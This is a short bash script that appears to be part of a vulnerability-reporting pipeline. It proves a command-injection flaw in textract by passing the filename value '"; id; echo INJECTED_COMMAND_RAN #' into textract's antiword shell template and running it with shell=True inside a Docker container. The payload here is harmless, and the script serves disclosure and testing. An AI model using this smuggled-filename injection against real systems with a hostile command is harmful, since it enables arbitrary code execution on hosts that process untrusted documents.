#!/bin/bash
# Execution witness for the textract command-injection finding.
#
# Runs a HARMLESS command (`id`) through the SAME sink the vulnerability uses
# (textract's shell=True command construction), inside the target image, and
# prints the REAL output. scan.sh captures this as the results dir's
# exec_proof.txt, which report.py renders as
# "Proof 3 — the injected command actually runs (live output)".
#
# Honest by construction: nothing is fabricated — the uid=... line is genuine
# output from `id` actually executing via the injection.
set -u
IMAGE="${1:-vuln-pipeline-textract:latest}"
TMP="$(mktemp)"
cat > "$TMP" <<'PY'
import subprocess, sys
filename = '"; id; echo INJECTED_COMMAND_RAN #'   # a command-injection filename
cmd = 'antiword "%s"' % filename                   # exactly textract's doc_parser template
print("[1] the shell command textract builds from the attacker's filename:")
print("    " + cmd)
print("")
print("[2] running it with shell=True, exactly like textract ShellParser.run:")
sys.stdout.flush()
subprocess.call(cmd, shell=True)
sys.stdout.flush()
print("")
print("[3] the uid=... line above is REAL output from the injected `id` command")
print("    executing as root in the container -- arbitrary command execution.")
PY
docker run --rm -v "$TMP":/w.py:ro "$IMAGE" python2 /w.py
rm -f "$TMP"
